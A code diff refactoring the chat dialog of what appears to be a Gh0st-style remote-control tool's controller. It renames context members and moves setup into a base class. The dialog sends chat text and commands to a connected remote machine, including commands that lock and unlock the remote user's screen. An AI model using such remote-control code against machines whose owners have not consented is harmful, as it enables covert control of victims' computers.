@@ -14,12 +14,8 @@
 
 
 CChat::CChat(CWnd* pParent, ISocketBase* pIOCPServer, ClientContext* pContext)
-    : DialogBase(CChat::IDD, pParent, pIOCPServer, pContext, 0)
+    : DialogBase(CChat::IDD, pParent, pIOCPServer, pContext, IDI_CHAT)
 {
-    m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_CHAT));
-    m_iocpServer = pIOCPServer;
-    m_pContext = pContext;
-    m_bOnClose = FALSE;
 }
 
 
@@ -51,13 +47,13 @@ BOOL CChat::OnInitDialog()
     CDialog::OnInitDialog();
 
     CString str;
-    str.Format(_T("远程交谈 - %s"), m_pContext->PeerName.c_str()),
+    str.Format(_T("远程交谈 - %s"), m_ContextObject->PeerName.c_str()),
                SetWindowText(str);
     m_editTip.SetWindowText(_T("提示: 对方聊天对话框在发送消息后才会弹出"));
     m_editNewMsg.SetLimitText(4079);
     // TODO: Add extra initialization here
     BYTE bToken = COMMAND_NEXT_CHAT;
-    m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
+    m_iocpServer->Send(m_ContextObject, &bToken, sizeof(BYTE));
     SetIcon(m_hIcon, TRUE);			// Set big icon
     SetIcon(m_hIcon, FALSE);		// Set small icon
 
@@ -71,8 +67,8 @@ void CChat::OnReceive()
 
 void CChat::OnReceiveComplete()
 {
-    m_pContext->m_DeCompressionBuffer.Write((LPBYTE)_T(""), 1);
-    char* strResult = (char*)m_pContext->m_DeCompressionBuffer.GetBuffer(0);
+    m_ContextObject->m_DeCompressionBuffer.Write((LPBYTE)_T(""), 1);
+    char* strResult = (char*)m_ContextObject->m_DeCompressionBuffer.GetBuffer(0);
     SYSTEMTIME st;
     GetLocalTime(&st);
     char Text[5120] = { 0 };
@@ -93,7 +89,7 @@ void CChat::OnButtonSend()
         return; // 发送消息为空不处理
     }
     m_editTip.ShowWindow(SW_HIDE);
-    m_iocpServer->Send(m_pContext, (LPBYTE)str, lstrlen(str) + sizeof(char));
+    m_iocpServer->Send(m_ContextObject, (LPBYTE)str, lstrlen(str) + sizeof(char));
     SYSTEMTIME st;
     GetLocalTime(&st);
     char Text[5120] = { 0 };
@@ -114,7 +110,7 @@ void CChat::OnButtonEnd()
 
 void CChat::OnClose()
 {
-	m_ContextObject->CancelIO();
+    CancelIO();
 
 	CDialogBase::OnClose();
 }
@@ -140,7 +136,7 @@ HBRUSH CChat::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
 
 void CChat::PostNcDestroy()
 {
-    if (!m_bOnClose)
+    if (!m_bIsClosed)
         OnCancel();
     CDialog::PostNcDestroy();
     delete this;
@@ -170,11 +166,11 @@ void CChat::OnBnClickedButton_LOCK()
 {
 
     BYTE bToken = COMMAND_CHAT_SCREEN_LOCK;
-    m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
+    m_iocpServer->Send(m_ContextObject, &bToken, sizeof(BYTE));
 }
 
 void CChat::OnBnClickedButton_UNLOCK()
 {
     BYTE bToken = COMMAND_CHAT_SCREEN_UNLOCK;
-    m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
+    m_iocpServer->Send(m_ContextObject, &bToken, sizeof(BYTE));
 }
